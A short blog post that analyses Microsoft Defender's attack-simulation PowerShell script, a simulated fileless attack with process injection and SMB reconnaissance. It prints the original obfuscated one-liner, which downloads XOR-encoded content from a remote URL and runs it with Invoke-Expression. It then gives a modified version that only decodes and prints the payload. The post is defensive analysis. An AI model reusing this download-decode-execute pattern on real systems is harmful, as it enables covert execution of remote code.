---
layout: post
title: "Microsoft 365 Attack Simulation"
excerpt: "Fileless PS attack with Process Injection and SMB recon"
excerpt_separator: "<!--more-->"
categories:
  - security
tags:
  - MicrosoftDefender
  - Security
last_modified_at: 2023-07-28T11:12:23-02:00
---



# Analyze the script



>You can download the script for the MS defender portal of your tenant

Here is the complete script:

```shell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor	= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String =	(Invoke-WebRequest -URI	https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt	-UseBasicParsing).Content;Try{ $contentBytes =	[System.Convert]::FromBase64String($base64String) } Catch { $contentBytes =	[System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;	$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];	$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression	([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

The script converts the string 'WinATP-Intro-Injection' into a byte array using UTF-8 encoding.
It then makes a web request to the specified URL, fetches the content of the response, and stores it in the $base64String variable.


Let's write some line to decypher it:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt -UseBasicParsing).Content;

Try {
    $contentBytes = [System.Convert]::FromBase64String($base64String)
} Catch {
    $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3))
};

$i = 0;
$decryptedBytes = @();
write-host -ForegroundColor Green deciphering...
$contentBytes.foreach{
    $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {$i = 0}
};

# Displaying the decrypted content without executing it
$decryptedContent = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
write-host -ForegroundColor Cyan $decryptedContent
```



And execute it:


For More documentaion
https://mtpstaticcontent.blob.core.windows.net/mtpstaticfiles/MTP_PowerShellFilelessInjectionSMBRecon.pdf